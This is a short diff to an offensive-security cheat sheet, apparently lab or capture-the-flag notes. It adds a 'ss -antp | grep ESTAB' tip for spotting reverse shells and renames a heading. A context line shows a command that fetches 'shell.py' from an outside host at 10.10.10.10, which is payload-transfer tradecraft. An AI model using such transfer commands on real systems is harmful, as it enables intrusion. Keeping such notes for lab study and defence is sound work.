@@ -69,7 +69,7 @@ FreeBSD:
 fetch 10.10.10.10:9999/shell.py
 ```
 
-Handy Scripts:
+Handy Scripts & Commands (Linux):
 
 Monitor processes in real-time *Thanx to Ippsec 
 ```
@@ -85,6 +85,11 @@ while true; do
   old_process=$new_process
 done
 ```
+Detecting Possible Reverse Shells:
+```
+ss -antp | grep ESTAB
+```
+
 Ping Sweeps
 
 Linux
